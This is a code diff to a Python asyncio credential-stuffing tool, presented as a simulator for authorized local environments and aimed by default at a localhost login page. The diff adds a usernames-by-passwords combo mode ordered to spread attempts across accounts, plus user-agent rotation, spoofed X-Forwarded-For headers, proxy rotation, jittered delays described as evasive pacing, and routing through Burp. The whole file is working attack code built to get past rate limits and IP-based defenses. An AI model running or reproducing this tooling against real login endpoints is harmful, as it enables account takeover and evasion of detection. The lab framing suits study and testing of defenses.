@@ -6,8 +6,9 @@ from __future__ import annotations
 
 import argparse
 import asyncio
+import itertools
 import json
-import random
+import sys
 import time
 from dataclasses import asdict, dataclass
 from datetime import datetime, timezone
@@ -17,15 +18,14 @@ from typing import List
 import aiohttp
 from colorama import Fore, Style, init
 
+REPO_ROOT = Path(__file__).resolve().parents[1]
+if str(REPO_ROOT) not in sys.path:
+    # Ensure sibling modules (evasion/, defense/) are importable when run as a script.
+    sys.path.insert(0, str(REPO_ROOT))
+
+from evasion import DelayManager, IPRotator, UserAgentRotator
+
 init(autoreset=True)
-
-
-DEFAULT_USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_5) AppleWebKit/605.1.15 Version/17.3 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1",
-]
 
 
 @dataclass(slots=True)
@@ -50,11 +50,17 @@ class AttemptResult:
 @dataclass(slots=True)
 class AttackConfig:
     url: str
-    credentials_file: Path
+    mode: str
+    credentials_file: Path | None
+    usernames_file: Path | None
+    passwords_file: Path | None
     concurrency: int
     timeout_seconds: int
     min_delay: float
     max_delay: float
+    max_combinations: int
+    proxy_list_file: Path | None
+    http_proxy: str | None
     success_pattern: str
     reports_dir: Path
 
@@ -68,33 +74,68 @@ class AttackEngine:
         self.failed_attempts = 0
         self.error_attempts = 0
         self._lock = asyncio.Lock()
+        self.user_agent_rotator = UserAgentRotator()
+        proxy_list_path = str(config.proxy_list_file) if config.proxy_list_file else None
+        self.ip_rotator = IPRotator(proxy_list_path=proxy_list_path)
 
     def load_credentials(self) -> None:
-        if not self.config.credentials_file.exists():
-            raise FileNotFoundError(f"Credentials file not found: {self.config.credentials_file}")
+        if self.config.mode == "pair":
+            if not self.config.credentials_file or not self.config.credentials_file.exists():
+                raise FileNotFoundError(f"Credentials file not found: {self.config.credentials_file}")
 
-        loaded: list[Credential] = []
-        with self.config.credentials_file.open("r", encoding="utf-8") as handle:
-            for idx, line in enumerate(handle, start=1):
-                line = line.strip()
-                if not line or line.startswith("#"):
-                    continue
-                if ":" not in line:
-                    raise ValueError(
-                        f"Invalid credentials format at line {idx}. Expected username:password"
-                    )
-                username, password = line.split(":", 1)
-                loaded.append(Credential(username=username.strip(), password=password.strip()))
+            loaded: list[Credential] = []
+            with self.config.credentials_file.open("r", encoding="utf-8") as handle:
+                for idx, line in enumerate(handle, start=1):
+                    line = line.strip()
+                    if not line or line.startswith("#"):
+                        continue
+                    if ":" not in line:
+                        raise ValueError(
+                            f"Invalid credentials format at line {idx}. Expected username:password"
+                        )
+                    username, password = line.split(":", 1)
+                    loaded.append(Credential(username=username.strip(), password=password.strip()))
 
-        if not loaded:
-            raise ValueError("No valid credentials were loaded.")
+            if not loaded:
+                raise ValueError("No valid credentials were loaded.")
+            self.credentials = loaded
+            print(f"{Fore.CYAN}Loaded {len(self.credentials)} username:password pairs.")
+            return
 
-        self.credentials = loaded
-        print(f"{Fore.CYAN}Loaded {len(self.credentials)} credentials.")
+        if not self.config.usernames_file or not self.config.usernames_file.exists():
+            raise FileNotFoundError(f"Usernames file not found: {self.config.usernames_file}")
+        if not self.config.passwords_file or not self.config.passwords_file.exists():
+            raise FileNotFoundError(f"Passwords file not found: {self.config.passwords_file}")
+
+        usernames = self._read_wordlist(self.config.usernames_file)
+        passwords = self._read_wordlist(self.config.passwords_file)
+        if not usernames or not passwords:
+            raise ValueError("Usernames/passwords list is empty.")
+
+        # Password-major ordering spreads attempts across many users first, which
+        # better matches stuffing behavior and finds valid pairs earlier in demos.
+        combos_iter = (
+            (username, password)
+            for password, username in itertools.product(passwords, usernames)
+        )
+        if self.config.max_combinations > 0:
+            combos_iter = itertools.islice(combos_iter, self.config.max_combinations)
+
+        self.credentials = [Credential(username=u, password=p) for u, p in combos_iter]
+        print(
+            f"{Fore.CYAN}Loaded combo mode: {len(usernames)} usernames x {len(passwords)} passwords "
+            f"-> {len(self.credentials)} attempts."
+        )
 
     @staticmethod
-    def _random_ip() -> str:
-        return ".".join(str(random.randint(1, 254)) for _ in range(4))
+    def _read_wordlist(path: Path) -> list[str]:
+        values: list[str] = []
+        with path.open("r", encoding="utf-8") as handle:
+            for line in handle:
+                item = line.strip()
+                if item and not item.startswith("#"):
+                    values.append(item)
+        return values
 
     @staticmethod
     def _now_utc() -> str:
@@ -109,10 +150,14 @@ class AttackEngine:
         total: int,
     ) -> None:
         async with semaphore:
-            await asyncio.sleep(random.uniform(self.config.min_delay, self.config.max_delay))
+            # Delay jitter avoids perfectly periodic traffic and simulates evasive pacing.
+            await DelayManager.random_delay(
+                min_delay=self.config.min_delay,
+                max_delay=self.config.max_delay,
+            )
 
-            user_agent = random.choice(DEFAULT_USER_AGENTS)
-            spoofed_ip = self._random_ip()
+            user_agent = self.user_agent_rotator.get_random_user_agent()
+            spoofed_ip = self.ip_rotator.generate_fake_ip()
             headers = {
                 "User-Agent": user_agent,
                 "X-Forwarded-For": spoofed_ip,
@@ -126,7 +171,13 @@ class AttackEngine:
             response_snippet = ""
 
             try:
-                async with session.post(self.config.url, data=payload, headers=headers) as response:
+                # Optional upstream HTTP proxy lets us route attack traffic via Burp.
+                async with session.post(
+                    self.config.url,
+                    data=payload,
+                    headers=headers,
+                    proxy=self.config.http_proxy,
+                ) as response:
                     http_status = response.status
                     response_text = (await response.text()).strip()
                     response_snippet = response_text[:120]
@@ -228,11 +279,17 @@ class AttackEngine:
             "meta": {
                 "generated_at_utc": self._now_utc(),
                 "target_url": self.config.url,
-                "credentials_file": str(self.config.credentials_file),
+                "mode": self.config.mode,
+                "credentials_file": str(self.config.credentials_file) if self.config.credentials_file else None,
+                "usernames_file": str(self.config.usernames_file) if self.config.usernames_file else None,
+                "passwords_file": str(self.config.passwords_file) if self.config.passwords_file else None,
                 "total_credentials": len(self.credentials),
                 "concurrency": self.config.concurrency,
                 "delay_range_seconds": [self.config.min_delay, self.config.max_delay],
                 "timeout_seconds": self.config.timeout_seconds,
+                "max_combinations": self.config.max_combinations,
+                "proxy_list_file": str(self.config.proxy_list_file) if self.config.proxy_list_file else None,
+                "http_proxy": self.config.http_proxy,
                 "success_pattern": self.config.success_pattern,
             },
             "summary": {
@@ -260,6 +317,12 @@ def parse_args() -> argparse.Namespace:
         description="Credential stuffing attack simulator for authorized local environments."
     )
     parser.add_argument(
+        "--mode",
+        choices=["pair", "combo"],
+        default="combo",
+        help="Attack dataset mode: pair=username:password lines, combo=usernames x passwords.",
+    )
+    parser.add_argument(
         "--url",
         default="http://localhost:5000/login",
         help="Target login endpoint URL (default: http://localhost:5000/login)",
@@ -268,6 +331,16 @@ def parse_args() -> argparse.Namespace:
         "--credentials",
         default=str(script_dir / "credentials.txt"),
         help="Path to credentials file (default: credentials.txt)",
+    )
+    parser.add_argument(
+        "--usernames-file",
+        default=str(script_dir / "usernames.txt"),
+        help="Path to username wordlist for combo mode.",
+    )
+    parser.add_argument(
+        "--passwords-file",
+        default=str(script_dir / "passwords.txt"),
+        help="Path to password wordlist for combo mode.",
     )
     parser.add_argument(
         "--concurrency",
@@ -294,6 +367,22 @@ def parse_args() -> argparse.Namespace:
         help="Maximum randomized delay between attempts (default: 0.60)",
     )
     parser.add_argument(
+        "--max-combinations",
+        type=int,
+        default=900,
+        help="Maximum combo attempts in combo mode (default: 900 for 30x30). Use 0 for all.",
+    )
+    parser.add_argument(
+        "--proxy-list",
+        default=str(script_dir / "proxy_list.txt"),
+        help="Path to proxy/IP list used for rotation (default: proxy_list.txt).",
+    )
+    parser.add_argument(
+        "--http-proxy",
+        default=None,
+        help="Route requests through an HTTP proxy (Burp), e.g. http://127.0.0.1:8080 or http://host.docker.internal:8080",
+    )
+    parser.add_argument(
         "--success-pattern",
         default="Login Successful",
         help='Case-insensitive response text indicating success (default: "Login Successful")',
@@ -315,17 +404,28 @@ def build_config(args: argparse.Namespace) -> AttackConfig:
         raise ValueError("--min-delay and --max-delay must be >= 0")
     if args.min_delay > args.max_delay:
         raise ValueError("--min-delay cannot be greater than --max-delay")
+    if args.max_combinations < 0:
+        raise ValueError("--max-combinations must be >= 0")
 
     credentials_path = Path(args.credentials).expanduser().resolve()
+    usernames_path = Path(args.usernames_file).expanduser().resolve()
+    passwords_path = Path(args.passwords_file).expanduser().resolve()
+    proxy_list_path = Path(args.proxy_list).expanduser().resolve()
     reports_path = Path(args.reports_dir).expanduser().resolve()
 
     return AttackConfig(
         url=args.url,
+        mode=args.mode,
         credentials_file=credentials_path,
+        usernames_file=usernames_path,
+        passwords_file=passwords_path,
         concurrency=args.concurrency,
         timeout_seconds=args.timeout,
         min_delay=args.min_delay,
         max_delay=args.max_delay,
+        max_combinations=args.max_combinations,
+        proxy_list_file=proxy_list_path,
+        http_proxy=args.http_proxy,
         success_pattern=args.success_pattern,
         reports_dir=reports_path,
     )
